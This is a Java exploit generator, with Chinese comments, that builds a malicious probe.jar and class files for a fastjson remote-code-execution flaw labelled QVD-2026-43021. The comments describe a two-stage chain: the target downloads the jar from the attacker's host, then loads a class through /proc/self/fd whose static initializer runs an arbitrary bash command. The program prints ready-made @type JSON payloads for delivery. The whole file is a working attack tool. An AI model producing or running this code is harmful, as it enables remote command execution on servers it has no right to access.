import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

/**
 * 生成恶意 probe.jar  (QVD-2026-43021 / hzhsec 版，支持 fd 两段式与 jdk8-http 两种模式)
 *
 * FD 模式原理:
 *   第一阶段 : 用 jar:http://<ip>:<port>/probe!/foo/Exception 诱使靶机下载 probe.jar
 *             (HTTP GET 副作用，把 jar 以某个 fd 形式挂在靶机 /proc/self/fd 下)
 *   FD 阶段  : 枚举 jar:file:.proc.self.fd.3 ~ .256，定位已下载的 jar，
 *             加载其中 fdN.Exception (带 @JSONType + <clinit> 执行命令) 触发 RCE
 *   jar:file: 是 JVM 原生支持的嵌套 jar URL，且指向本地已打开的 fd，
 *   因此 LaunchedURLClassLoader.getResourceAsStream 能成功 => @JSONType 信任路径打通
 */

public class GenProbe {
    private static final int MIN_FD = 3;
    private static final int MAX_FD = 2048;

    private static String cleanTag(String tag) {
        if (tag == null || tag.isEmpty()) {
            return "";
        }
        if (!tag.matches("[A-Za-z0-9_]+")) {
            throw new IllegalArgumentException("tag must match [A-Za-z0-9_]+");
        }
        return tag;
    }

    private static String toPayloadHost(String host) {
        if (host.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
            String[] parts = host.split("\\.");
            long ipInt = (Long.parseLong(parts[0]) << 24) | (Long.parseLong(parts[1]) << 16)
                       | (Long.parseLong(parts[2]) << 8) | Long.parseLong(parts[3]);
            return String.valueOf(ipInt);
        }
        return host;
    }

    private static byte[] makeClass(String internalName, String cmd, boolean jsonType, boolean execCommand) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        if (jsonType) {
            AnnotationVisitor av = cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
            av.visit("asm", Boolean.FALSE);
            av.visitEnd();
        }

        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(1, 1);
        init.visitEnd();

        if (execCommand) {
            MethodVisitor clinit = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
            clinit.visitCode();
            clinit.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            clinit.visitInsn(Opcodes.ICONST_3);
            clinit.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);
            clinit.visitLdcInsn("/bin/bash"); clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);
            clinit.visitLdcInsn("-c"); clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);
            clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);
            clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            clinit.visitInsn(Opcodes.POP);
            clinit.visitInsn(Opcodes.RETURN);
            clinit.visitMaxs(5, 0);
            clinit.visitEnd();
        }

        cw.visitEnd();
        return cw.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String lhost = args.length > 0 ? args[0] : "127.0.0.1";
        String lport = args.length > 1 ? args[1] : "19090";
        String cmd = args.length > 2 ? args[2] : "open -a Calculator";
        String mode = args.length > 3 ? args[3] : "fd";
        String tag = cleanTag(args.length > 4 ? args[4] : "");

        String payloadHost = toPayloadHost(lhost);
        String classSuffix = tag.isEmpty() ? "" : tag;

        Files.createDirectories(Paths.get("poc/www"));
        if ("jdk8-http".equals(mode)) {
            Files.deleteIfExists(Paths.get("poc/www/" + (tag.isEmpty() ? "a" : "A" + classSuffix) + ".class"));
            String className = tag.isEmpty() ? "a" : "A" + classSuffix;
            String internal = "http://" + payloadHost + ":" + lport + "/" + className;
            Files.write(Paths.get("poc/www/" + className + ".class"), makeClass(internal, cmd, true, true));
            System.out.println("[+] poc/www/" + className + ".class generated");
            System.out.println("[+] JDK8 HTTP payload: {\"@type\":\"http:.." + payloadHost + ":" + lport + "." + className + "\"}");
            return;
        }

        Path jarPath = Paths.get("poc/probe.jar");
        String probeName = tag.isEmpty() ? "probe" : "probe_" + classSuffix;
        String firstClass = tag.isEmpty() ? "Exception" : "T" + classSuffix + "Exception";
        String fdClass = tag.isEmpty() ? "Exception" : "T" + classSuffix + "Exception";
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath.toFile()))) {
            String firstInternal = "jar:http://" + payloadHost + ":" + lport + "/" + probeName + "!/foo/" + firstClass;
            jos.putNextEntry(new JarEntry("foo/" + firstClass + ".class"));
            jos.write(makeClass(firstInternal, cmd, false, false));
            jos.closeEntry();

            for (int fd = MIN_FD; fd <= MAX_FD; fd++) {
                String entry = "fd" + fd + "/" + fdClass + ".class";
                String internal = "jar:file:/proc/self/fd/" + fd + "!/fd" + fd + "/" + fdClass;
                jos.putNextEntry(new JarEntry(entry));
                jos.write(makeClass(internal, cmd, true, true));
                jos.closeEntry();
            }
        }
        Files.copy(jarPath, Paths.get("poc/www/" + probeName), StandardCopyOption.REPLACE_EXISTING);

        System.out.println("[+] poc/probe.jar & poc/www/" + probeName + " generated");
        System.out.println("[+] First stage: {\"@type\":\"jar:http:.." + payloadHost + ":" + lport + "." + probeName + "!.foo." + firstClass + "\"}");
        System.out.println("[+] FD stages: jar:file:.proc.self.fd.3!.fd3." + fdClass + " ... jar:file:.proc.self.fd." + MAX_FD + "!.fd" + MAX_FD + "." + fdClass);
    }
}
